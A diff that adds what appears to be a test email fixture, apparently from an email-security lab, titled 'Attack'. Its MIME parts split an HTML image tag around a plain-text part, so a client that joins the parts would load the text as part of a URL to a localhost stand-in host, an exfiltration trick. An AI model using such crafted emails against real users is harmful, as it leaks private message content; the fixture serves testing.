@@ -1,0 +1,19 @@
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+Subject: Attack
+From: samuel.bell@emaillab.ch
+To: chris.pruett@emaillab.ch
+
+--BOUNDARY
+Content-Type: text/html
+
+<img src="http://localhost:8080/
+--BOUNDARY
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+Blubbi
+--BOUNDARY
+Content-Type: text/html
+
+">
+--BOUNDARY--
